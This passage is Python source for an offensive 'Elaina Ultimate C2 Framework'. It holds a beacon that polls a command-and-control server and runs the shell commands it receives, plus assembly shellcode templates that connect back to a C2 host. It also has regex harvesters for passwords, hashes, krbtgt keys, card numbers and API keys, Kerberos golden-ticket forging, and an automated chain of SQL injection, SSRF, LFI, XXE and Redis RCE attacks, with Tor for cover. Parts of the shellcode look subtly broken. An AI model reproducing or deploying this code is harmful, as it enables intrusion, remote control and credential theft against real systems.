                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
                response = urllib.request.urlopen(req, context=context)
            else:
                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
                response = urllib.request.urlopen(req)
            
            return response.getcode() == 200
        except:
            return False
    
    def execute_task(self, task):
        try:
            task_type = task.get("type")
            task_data = task.get("data")
            task_id = task.get("task_id")
            
            result = {{"status": "error", "message": "Unknown task type"}}
            
            if task_type == "shell":
                try:
                    process = subprocess.Popen(
                        task_data, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate()
                    
                    result = {{
                        "status": "success",
                        "exit_code": process.returncode,
                        "stdout": stdout,
                        "stderr": stderr
                    }}
                except Exception as e:
                    result = {{
                        "status": "error",
                        "message": str(e)
                    }}
            
            elif task_type == "kill":
                self.running = False
                result = {{
                    "status": "success",
                    "message": "Beacon shutting down"
                }}
            
            self.send_result(task_id, result)
            return result
        except Exception as e:
            result = {{
                "status": "error",
                "message": str(e)
            }}
            self.send_result(task_id, result)
            return result
    
    def start(self):
        try:
            if not self.register_beacon():
                return False
            
            self.running = True
            
            while self.running:
                try:
                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
                    time.sleep(actual_sleep)
                    
                    tasks = self.get_tasks()
                    
                    for task in tasks:
                        self.execute_task(task)
                
                except KeyboardInterrupt:
                    self.running = False
                except:
                    time.sleep(30)
            
            return True
        except:
            return False

if __name__ == "__main__":
    beacon = Beacon()
    beacon.start()
"""
        return payload_code
    
    def generate_shellcode_payload(self, listener_info, architecture, format_type):
        if format_type != "raw":
            raise Exception("Invalid format for Shellcode payload")
        
        if architecture == "x86":
            payload_code = f"""section .text
global _start

_start:
    ; Create socket
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov ecx, esp
    push ebx
    push ecx
    push 0x1
    push 0x2
    int 0x80
    xchg esi, eax
    
    ; Connect to C2 server
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x3
    push 0x{int(listener_info['host'].split('.')[3]):02x}{int(listener_info['host'].split('.')[2]):02x}
    push 0x{int(listener_info['host'].split('.')[1]):02x}{int(listener_info['host'].split('.')[0]):02x}
    push word 0x{listener_info['port']:04x}
    push word 0x2
    mov ecx, esp
    push 0x10
    push ecx
    push esi
    int 0x80
    
    ; Send system information
    mov al, 0x4
    mov ebx, esi
    mov ecx, esp
    mov edx, 0x100
    int 0x80
    
    ; Main beacon loop
beacon_loop:
    ; Receive commands
    mov al, 0x3
    mov ebx, esi
    mov ecx, esp
    mov edx, 0x1000
    int 0x80
    
    ; Execute command
    mov al, 0xb
    xor ebx, ebx
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    
    ; Send result
    mov al, 0x4
    mov ebx, esi
    mov ecx, esp
    mov edx, 0x1000
    int 0x80
    
    ; Sleep
    mov al, 0xa2
    mov ebx, 0x{listener_info['port']:08x}
    xor ecx, ecx
    xor edx, edx
    int 0x80
    
    jmp beacon_loop
"""
        else:  # x64
            payload_code = f"""section .text
global _start

_start:
    ; Create socket
    push 0x29
    pop rax
    cdq
    push rdx
    push rsi
    mov rdi, rsp
    push rdx
    push rdi
    push 0x2
    mov al, 0x41
    syscall
    
    xchg rdi, rax
    
    ; Connect to C2 server
    mov rax, 0x{int(listener_info['host'].replace('.', '')):08x}
    push rax
    mov rax, 0x{listener_info['port']:04x}0000
    push rax
    mov rsi, rsp
    push 0x10
    pop rdx
    push rsi
    push rdi
    mov al, 0x42
    syscall
    
    ; Send system information
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0x1
    syscall
    
    ; Main beacon loop
beacon_loop:
    ; Receive commands
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0x0
    syscall
    
    ; Execute command
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push rax
    push rdi
    push rsi
    push rdx
    mov rax, 0x3b
    pop rsi
    pop rdx
    pop rdi
    syscall
    
    ; Send result
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0x1
    syscall
    
    ; Sleep
    mov rax, 0x35
    mov rdi, 0x{listener_info['port']:08x}
    xor rsi, rsi
    xor rdx, rdx
    syscall
    
    jmp beacon_loop
"""
        return payload_code
        
    def add_listener(self):
        name = self.listener_name_input.text()
        listener_type = self.listener_type_combo.currentText()
        host = self.listener_host_input.text()
        port = self.listener_port_input.value()
        ssl_enabled = self.listener_ssl_checkbox.isChecked()
        
        if name and host:
            row_position = self.listeners_table.rowCount()
            self.listeners_table.insertRow(row_position)
            
            self.listeners_table.setItem(row_position, 0, QTableWidgetItem(name))
            self.listeners_table.setItem(row_position, 1, QTableWidgetItem(listener_type))
            self.listeners_table.setItem(row_position, 2, QTableWidgetItem(host))
            self.listeners_table.setItem(row_position, 3, QTableWidgetItem(str(port)))
            self.listeners_table.setItem(row_position, 4, QTableWidgetItem("Running"))
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "add_listener",
                "target": name,
                "status": "success"
            })
            
            self.status_bar.showMessage(f"Listener {name} added")
        else:
            QMessageBox.warning(self, "Error", "Name and host are required")
            
    def remove_listener(self):
        selected_items = self.listeners_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a listener to remove.")
            return
        
        row = selected_items[0].row()
        listener_name = self.listeners_table.item(row, 0).text()
        
        reply = QMessageBox.question(self, "Confirm Removal", 
                                    f"Are you sure you want to remove listener {listener_name}?",
                                    QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            self.listeners_table.removeRow(row)
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "remove_listener",
                "target": listener_name,
                "status": "success"
            })
            
            self.status_bar.showMessage(f"Listener {listener_name} removed")
            
    def remove_listener_by_name(self, listener_name):
        for row in range(self.listeners_table.rowCount()):
            if self.listeners_table.item(row, 0).text() == listener_name:
                self.listeners_table.removeRow(row)
                
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "remove_listener",
                    "target": listener_name,
                    "status": "success"
                })
                
                self.status_bar.showMessage(f"Listener {listener_name} removed")
                return True
        return False
        
    def new_script(self):
        self.script_editor.clear()
        
    def save_script(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Script", "", "Elaina Scripts (*.elaina);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(self.script_editor.toPlainText())
                
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "save_script",
                    "target": file_path,
                    "status": "success"
                })
                
                self.status_bar.showMessage(f"Script saved to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save script: {str(e)}")
                
    def load_script(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Load Script", "", "Elaina Scripts (*.elaina);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.script_editor.setPlainText(f.read())
                
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "load_script",
                    "target": file_path,
                    "status": "success"
                })
                
                self.status_bar.showMessage(f"Script loaded from {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load script: {str(e)}")
                
    def execute_script(self):
        script_content = self.script_editor.toPlainText()
        if script_content:
            try:
                self.script_engine.execute_script(script_content)
                
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "execute_script",
                    "target": "inline",
                    "status": "success"
                })
                
                self.status_bar.showMessage("Script executed successfully")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to execute script: {str(e)}")
                
    def run_script(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Run Script", "", "Elaina Scripts (*.elaina);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    script_content = f.read()
                
                self.script_engine.execute_script(script_content, os.path.basename(file_path))
                
                self.log_entries.append({
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "action": "run_script",
                    "target": file_path,
                    "status": "success"
                })
                
                self.status_bar.showMessage(f"Script {os.path.basename(file_path)} executed successfully")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to run script: {str(e)}")
                
    def navigate_to_url(self):
        url = self.url_input.text()
        if url:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            self.web_view.setUrl(QUrl(url))
            
            self.log_entries.append({
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "action": "navigate",
                "target": url,
                "status": "success"
            })
            
            self.status_bar.showMessage(f"Navigated to {url}")
            
    def save_all_output(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save All Output", "", "Text Files (*.txt)")
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write("=== ELAINA ULTIMATE OUTPUT ===\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    
                    f.write("=== BEACONS ===\n\n")
                    for beacon_id, beacon_info in self.beacons.items():
                        f.write(f"Beacon ID: {beacon_id}\n")
                        f.write(f"Internal IP: {beacon_info.get('address', ['N/A'])[0]}\n")
                        f.write(f"User: {beacon_info.get('user', 'N/A')}\n")
                        f.write(f"Hostname: {beacon_info.get('hostname', 'N/A')}\n")
                        f.write(f"OS: {beacon_info.get('os', 'N/A')}\n")
                        f.write(f"Last Checkin: {datetime.fromtimestamp(beacon_info.get('last_checkin', 0)).strftime('%Y-%m-%d %H:%M:%S') if beacon_info.get('last_checkin', 0) > 0 else 'N/A'}\n")
                        f.write("-" * 50 + "\n")
                    
                    f.write("\n")
                    
                    f.write("=== ACTIVITY LOG ===\n\n")
                    for entry in self.log_entries:
                        f.write(f"[{entry['time']}] {entry['action']} {entry['target']} {entry['status']}\n")
                        if entry.get('detail'):
                            f.write(f"  Detail: {entry['detail']}\n")
                    
                    f.write("\n")
                    
                    if hasattr(self, 'enhanced_output'):
                        self.enhanced_output.save_output(file_path)
                
                QMessageBox.information(self, "Success", f"All output saved to {file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save output: {str(e)}")

class EnhancedElainaMainWindow(ElainaMainWindow):
    def __init__(self):
        super().__init__()
        self.output_displays = {}
        self.init_enhanced_ui()
        
    def init_enhanced_ui(self):
        for i in range(self.tab_widget.count()):
            if self.tab_widget.tabText(i) == "Beacons":
                beacons_widget = self.tab_widget.widget(i)
                
                for child in beacons_widget.children():
                    if isinstance(child, QGroupBox) and child.title() == "Beacon Output":
                        layout = child.layout()
                        if layout:
                            if layout.itemAt(0) and isinstance(layout.itemAt(0).widget(), QTextEdit):
                                layout.itemAt(0).widget().deleteLater()
                            
                            self.enhanced_output = OutputDisplayWidget()
                            layout.addWidget(self.enhanced_output)
                        break
                break
                
    def interact_with_beacon(self):
        selected_items = self.beacons_table.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a beacon to interact with.")
            return
        
        row = selected_items[0].row()
        beacon_id = self.beacons_table.item(row, 0).text()
        
        dialog = EnhancedBeaconInteractDialog(self, beacon_id, self.beacons.get(beacon_id, {}))
        dialog.command_sent.connect(self.send_beacon_command)
        dialog.exec_()
        
    def add_beacon_result(self, beacon_id, result):
        if hasattr(self, 'enhanced_output'):
            timestamp = datetime.now().strftime('%H:%M:%S')
            
            if "stdout" in result and result["stdout"]:
                self.enhanced_output.add_console_output(f"[{timestamp}] {result['stdout']}")
            
            if "stderr" in result and result["stderr"]:
                self.enhanced_output.add_console_output(f"[{timestamp}] {result['stderr']}", "#FF0000")
            
            self.extract_credentials(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
            self.extract_sysinfo(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
            self.extract_network_info(result.get("stdout", "") + result.get("stderr", ""), beacon_id)
            
            super().add_beacon_result(beacon_id, result)
            
    def extract_credentials(self, text, source):
        patterns = [
            r'password[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'pwd[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'pass[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'([a-fA-F0-9]{32})',
            r'([a-fA-F0-9]{40})',
            r'([a-fA-F0-9]{64})',
            r'([a-fA-F0-9]{128})',
            r'([a-fA-F0-9]{32}:[a-fA-F0-9]{32})',
            r'krbtgt:[a-fA-F0-9]{32}',
            r'(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})',
            r'(AIza[0-9A-Za-z\-_]{35})',
            r'(sk-[a-zA-Z0-9-_]{48})',
            r'(pk-[a-zA-Z0-9-_]{48})',
        ]
        
        user_pass_patterns = [
            r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)[\s,]+([^\s,]+)',
            r'username[\'"\s]*[:=][\'"\s]*([^\s\'"]+)[\s,]+password[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
            r'user[\'"\s]*[:=][\'"\s]*([^\s\'"]+)[\s,]+pass[\'"\s]*[:=][\'"\s]*([^\s\'"]+)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if isinstance(match, tuple):
                    for m in match:
                        if m and len(m) > 3:
                            self.enhanced_output.add_credential("Unknown", m, "Hash/Token", source)
                else:
                    if match and len(match) > 3:
                        self.enhanced_output.add_credential("Unknown", match, "Hash/Token", source)
        
        for pattern in user_pass_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if isinstance(match, tuple) and len(match) >= 2:
                    username = match[0]
                    password = match[1]
                    if username and password and len(username) > 2 and len(password) > 2:
                        self.enhanced_output.add_credential(username, password, "Plaintext", source)
                        
    def extract_sysinfo(self, text, source):
        sysinfo = {}
        
        os_patterns = [
            r'(Windows\s+\S+)',
            r'(Linux\s+\S+)',
            r'(macOS\s+\S+)',
            r'(Darwin\s+\S+)',
            r'(Ubuntu\s+\S+)',
            r'(CentOS\s+\S+)',
            r'(Debian\s+\S+)',
            r'(Red Hat\s+\S+)',
            r'(Fedora\s+\S+)',
            r'(SUSE\s+\S+)',
            r'(Arch\s+\S+)',
            r'(Mint\s+\S+)'
        ]
        
        for pattern in os_patterns:
            match = re.search(pattern, text)
            if match:
                sysinfo["OS"] = match.group(1)
                break
                
        hostname_patterns = [
            r'Hostname:\s*(\S+)',
            r'ComputerName:\s*(\S+)',
            r'Host Name:\s*(\S+)',
            r'Name:\s*(\S+)'
        ]
        
        for pattern in hostname_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                sysinfo["Hostname"] = match.group(1)
                break
                
        username_patterns = [
            r'User Name:\s*(\S+)',
            r'Username:\s*(\S+)',
            r'User:\s*(\S+)',
            r'Current User:\s*(\S+)',
            r'Logged in as:\s*(\S+)'
        ]
        
        for pattern in username_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                sysinfo["User"] = match.group(1)
                break
                
        ip_patterns = [
            r'IPv4 Address[.\s]+:\s*(\d+\.\d+\.\d+\.\d+)',
            r'IP Address[.\s]+:\s*(\d+\.\d+\.\d+\.\d+)',
            r'IP[.\s]+:\s*(\d+\.\d+\.\d+\.\d+)',
            r'(\d+\.\d+\.\d+\.\d+)'
        ]
        
        ips = []
        for pattern in ip_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if match and match not in ips:
                    ips.append(match)
        
        if ips:
            sysinfo["IP Addresses"] = ips
            
        mac_patterns = [
            r'MAC Address[.\s]+:\s*([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})',
            r'Physical Address[.\s]+:\s*([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})',
            r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})'
        ]
        
        macs = []
        for pattern in mac_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if match and match not in macs:
                    macs.append(match)
        
        if macs:
            sysinfo["MAC Addresses"] = macs
            
        if sysinfo:
            self.enhanced_output.add_sysinfo(sysinfo)
            
    def extract_network_info(self, text, source):
        connection_patterns = [
            r'TCP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+(\w+)',
            r'UDP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+(\*\.\*\.\*\.\*|\d+\.\d+\.\d+\.\d+):(\d+)\s+(\w+)'
        ]
        
        connections = []
        for pattern in connection_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if len(match) >= 5:
                    conn = {
                        "protocol": "TCP" if pattern.startswith("TCP") else "UDP",
                        "local_address": match[0],
                        "local_port": match[1],
                        "remote_address": match[2],
                        "remote_port": match[3],
                        "state": match[4] if len(match) > 4 else "N/A"
                    }
                    connections.append(conn)
        
        listening_patterns = [
            r'TCP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+0\.0\.0\.0:0\s+(LISTENING)',
            r'UDP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s+\*\.\*\.\*\.\*:\*\s+(.*)'
        ]
        
        listening_ports = []
        for pattern in listening_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if len(match) >= 2:
                    port = {
                        "protocol": "TCP" if pattern.startswith("TCP") else "UDP",
                        "address": match[0],
                        "port": match[1],
                        "state": "LISTENING"
                    }
                    listening_ports.append(port)
        
        if connections or listening_ports:
            network_info = "=== NETWORK INFORMATION ===\n\n"
            
            if connections:
                network_info += "=== CONNECTIONS ===\n"
                network_info += f"{'Protocol':<8} {'Local Address':<20} {'Local Port':<12} {'Remote Address':<20} {'Remote Port':<12} {'State':<12}\n"
                network_info += "-" * 84 + "\n"
                
                for conn in connections:
                    network_info += f"{conn['protocol']:<8} {conn['local_address']:<20} {conn['local_port']:<12} {conn['remote_address']:<20} {conn['remote_port']:<12} {conn['state']:<12}\n"
                
                network_info += "\n"
            
            if listening_ports:
                network_info += "=== LISTENING PORTS ===\n"
                network_info += f"{'Protocol':<8} {'Address':<20} {'Port':<12} {'State':<12}\n"
                network_info += "-" * 52 + "\n"
                
                for port in listening_ports:
                    network_info += f"{port['protocol']:<8} {port['address']:<20} {port['port']:<12} {port['state']:<12}\n"
            
            self.enhanced_output.add_network_output(network_info, "#0000FF")

def execute(target=None, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", use_burp=False, winrm_user=None, winrm_pass=None, pfx_path=None, pfx_password=None, 
            golden_ticket=False, gt_domain=None, gt_user=None, gt_krbtgt_hash=None, gt_sid=None, gt_dc_ip=None, gt_lifetime=10, gt_target=None, gt_command=None,
            c2_server=False, c2_host=None, c2_port=None, c2_ssl=False, c2_cert=None, c2_key=None,
            c2_beacon=False, c2_beacon_host=None, c2_beacon_port=None, c2_beacon_ssl=False,
            silver_c2=False, silver_c2_host=None, silver_c2_port=None, silver_c2_domain=None,
            gui=False):
    open(LOG_JSON_PATH, "w").write("[]")
    open(COOKIE_PATH, "w").write("")
    
    if gui:
        global main_window
        app = QApplication(sys.argv)
        app.setApplicationName("Elaina Ultimate C2 Framework")
        app.setApplicationVersion("1.0")
        
        main_window = EnhancedElainaMainWindow()
        main_window.show()
        
        file_menu = main_window.menuBar().findChild(QMenu, "File")
        if file_menu:
            save_all_output_action = QAction("Save All Output", main_window)
            save_all_output_action.triggered.connect(main_window.save_all_output)
            file_menu.addAction(save_all_output_action)
        
        sys.exit(app.exec_())
    
    logger.info("Running in CLI mode")
    
    if c2_server and c2_host and c2_port:
        c2 = C2Server(c2_host, c2_port, c2_ssl, c2_cert, c2_key)
        if c2.start():
            logger.info(f"C2 server started on {c2_host}:{c2_port}")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                c2.stop()
                logger.info("C2 server stopped")
                sys.exit(0)
        else:
            logger.error("Failed to start C2 server")
            sys.exit(1)
    
    if c2_beacon and c2_beacon_host and c2_beacon_port:
        beacon = OptimizedBeacon(c2_beacon_host, c2_beacon_port, "http", c2_beacon_ssl)
        if beacon.start():
            logger.info("C2 beacon started successfully")
            sys.exit(0)
        else:
            logger.error("Failed to start C2 beacon")
            sys.exit(1)
    
    if silver_c2 and silver_c2_host and silver_c2_port:
        silver_beacon = StealthBeacon(silver_c2_host, silver_c2_port, "http", False)
        if silver_beacon.start():
            logger.info("Silver C2 beacon started successfully")
            sys.exit(0)
        else:
            logger.error("Failed to start Silver C2 beacon")
            sys.exit(1)
    
    if golden_ticket and gt_domain and gt_user and gt_krbtgt_hash and gt_sid:
        gt = GoldenTicket(gt_domain, gt_user, gt_krbtgt_hash, gt_sid, gt_dc_ip, gt_lifetime)
        ccache_path = gt.create_ticket()
        gt.inject_ticket()
        
        if gt_target:
            gt.use_ticket(gt_target, gt_command)
    
    if not target:
        logger.error("No target URL specified for CLI mode")
        logger.info("Use --gui to start in GUI mode, or provide a target URL")
        sys.exit(1)
    
    if use_tor:
        renew_tor_ip(tor_pass)
    
    proxy_cfg = load_proxy_config()
    session = setup_scraper(proxy_cfg)
    
    ldap_ip = None
    if ldap_subnet:
        ldap_candidates = scan_ldap_ips(ldap_subnet)
        if ldap_candidates:
            ldap_ip = ldap_candidates[0]
        else:
            ldap_ip = "10.0.0.5"
    else:
        ldap_ip = "10.0.0.5"
    
    spider(target, session)
    if not chain_exploit_ssrf_to_adcs(session, target, ldap_ip, winrm_user, winrm_pass, pfx_path, pfx_password):
        attempt_sql_injection(target, session)
        attempt_ssrf(target, session, ldap_ip)
        attempt_lfi(target, session)
        attempt_xxe(target, session)
        attempt_idor(target, session)
        attempt_redis_rce(ldap_ip)
    
    driver = setup_browser(proxy_cfg)
    try:
        storage = dump_browser_storage(driver, target)
        js_endpoints = extract_js_endpoints(driver)
        ws_endpoints = dump_websocket_endpoints(driver)
        
        if use_burp:
            for req in driver.requests:
                send_to_burp(req)
        
        full_log = {
            "url": target,
            "storage": storage,
            "js_endpoints": js_endpoints,
            "websocket_endpoints": ws_endpoints,
            "chain_exploit": True
        }
        
        with open(LOG_JSON_PATH, "a") as f:
            f.write(json.dumps(full_log, indent=2))
    finally:
        driver.quit()

def main():
    parser = argparse.ArgumentParser(description="ELAINA-C2-FRAMEWORK")
    parser.add_argument("url", help="Target URL to scan & attack", nargs='?', default=None)
    parser.add_argument("--tor", action="store_true", help="Enable TOR")
    parser.add_argument("--tor-pass", default="yuriontop", help="TOR control password")
    parser.add_argument("--burp", action="store_true", help="Send requests to Burp Repeater API")
    parser.add_argument("--ldap-subnet", help="CIDR subnet for LDAP scan, e.g. 10.0.0.0/24")
    parser.add_argument("--winrm-user", help="Username for WinRM PowerShell execution")
    parser.add_argument("--winrm-pass", help="Password for WinRM PowerShell execution")
    parser.add_argument("--pfx-path", help="Path to .pfx certificate for WinRM authentication")
    parser.add_argument("--pfx-password", help="Password for .pfx certificate")
    
    parser.add_argument("--golden-ticket", action="store_true", help="Generate a Golden Ticket")
    parser.add_argument("--gt-domain", help="Domain for Golden Ticket")
    parser.add_argument("--gt-user", help="Username for Golden Ticket")
    parser.add_argument("--gt-krbtgt-hash", help="Hash of krbtgt account for Golden Ticket")
    parser.add_argument("--gt-sid", help="Domain SID for Golden Ticket")
    parser.add_argument("--gt-dc-ip", help="Domain Controller IP (optional)")
    parser.add_argument("--gt-lifetime", type=int, default=10, help="Golden ticket lifetime in hours (default: 10)")
    parser.add_argument("--gt-target", help="Target to use the Golden Ticket against")
    parser.add_argument("--gt-command", help="Command to execute with the Golden Ticket")
    
    parser.add_argument("--c2-server", action="store_true", help="Start C2 server")
    parser.add_argument("--c2-host", default="0.0.0.0", help="C2 server host (default: 0.0.0.0)")
    parser.add_argument("--c2-port", type=int, default=8080, help="C2 server port (default: 8080)")
    parser.add_argument("--c2-ssl", action="store_true", help="Enable SSL for C2 server")
    parser.add_argument("--c2-cert", help="Path to SSL certificate file")
    parser.add_argument("--c2-key", help="Path to SSL private key file")
    
    parser.add_argument("--c2-beacon", action="store_true", help="Start C2 beacon")
    parser.add_argument("--c2-beacon-host", help="C2 server host for beacon")
    parser.add_argument("--c2-beacon-port", type=int, help="C2 server port for beacon")
    parser.add_argument("--c2-beacon-ssl", action="store_true", help="Enable SSL for C2 beacon")
    
    parser.add_argument("--silver-c2", action="store_true", help="Start Silver C2 beacon")
    parser.add_argument("--silver-c2-host", help="Silver C2 server host")
    parser.add_argument("--silver-c2-port", type=int, help="Silver C2 server port")
    parser.add_argument("--silver-c2-domain", help="Silver C2 domain for DNS tunneling")
    
    parser.add_argument("--gui", action="store_true", help="Start GUI interface")
    parser.add_argument("--no-gui", action="store_true", help="Force CLI mode")
    
    args = parser.parse_args()
    
    if args.gui:
        logger.info("Starting in GUI mode")
        execute(
            target=args.url,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
            pfx_path=args.pfx_path,
            pfx_password=args.pfx_password,
            golden_ticket=args.golden_ticket,
            gt_domain=args.gt_domain,
            gt_user=args.gt_user,
            gt_krbtgt_hash=args.gt_krbtgt_hash,
            gt_sid=args.gt_sid,
            gt_dc_ip=args.gt_dc_ip,
            gt_lifetime=args.gt_lifetime,
            gt_target=args.gt_target,
            gt_command=args.gt_command,
            c2_server=args.c2_server,
            c2_host=args.c2_host,
            c2_port=args.c2_port,
            c2_ssl=args.c2_ssl,
            c2_cert=args.c2_cert,
            c2_key=args.c2_key,
            c2_beacon=args.c2_beacon,
            c2_beacon_host=args.c2_beacon_host,
            c2_beacon_port=args.c2_beacon_port,
            c2_beacon_ssl=args.c2_beacon_ssl,
            silver_c2=args.silver_c2,
            silver_c2_host=args.silver_c2_host,
            silver_c2_port=args.silver_c2_port,
            silver_c2_domain=args.silver_c2_domain,
            gui=True
        )
    elif not args.url and not args.no_gui:
        logger.info("No target URL specified, starting in GUI mode")
        execute(
            target=None,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
            pfx_path=args.pfx_path,
            pfx_password=args.pfx_password,
            golden_ticket=args.golden_ticket,
            gt_domain=args.gt_domain,
            gt_user=args.gt_user,
            gt_krbtgt_hash=args.gt_krbtgt_hash,
            gt_sid=args.gt_sid,
            gt_dc_ip=args.gt_dc_ip,
            gt_lifetime=args.gt_lifetime,
            gt_target=args.gt_target,
            gt_command=args.gt_command,
            c2_server=args.c2_server,
            c2_host=args.c2_host,
            c2_port=args.c2_port,
            c2_ssl=args.c2_ssl,
            c2_cert=args.c2_cert,
            c2_key=args.c2_key,
            c2_beacon=args.c2_beacon,
            c2_beacon_host=args.c2_beacon_host,
            c2_beacon_port=args.c2_beacon_port,
            c2_beacon_ssl=args.c2_beacon_ssl,
            silver_c2=args.silver_c2,
            silver_c2_host=args.silver_c2_host,
            silver_c2_port=args.silver_c2_port,
            silver_c2_domain=args.silver_c2_domain,
            gui=True
        )
    else:
        logger.info("Starting in CLI mode")
        execute(
            target=args.url,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
            pfx_path=args.pfx_path,
            pfx_password=args.pfx_password,
            golden_ticket=args.golden_ticket,
            gt_domain=args.gt_domain,
            gt_user=args.gt_user,
            gt_krbtgt_hash=args.gt_krbtgt_hash,
            gt_sid=args.gt_sid,
            gt_dc_ip=args.gt_dc_ip,
            gt_lifetime=args.gt_lifetime,
            gt_target=args.gt_target,
            gt_command=args.gt_command,
            c2_server=args.c2_server,
            c2_host=args.c2_host,
            c2_port=args.c2_port,
            c2_ssl=args.c2_ssl,
            c2_cert=args.c2_cert,
            c2_key=args.c2_key,
            c2_beacon=args.c2_beacon,
            c2_beacon_host=args.c2_beacon_host,
            c2_beacon_port=args.c2_beacon_port,
            c2_beacon_ssl=args.c2_beacon_ssl,
            silver_c2=args.silver_c2,
            silver_c2_host=args.silver_c2_host,
            silver_c2_port=args.silver_c2_port,
            silver_c2_domain=args.silver_c2_domain,
            gui=False
        )

if __name__ == "__main__":
    main()
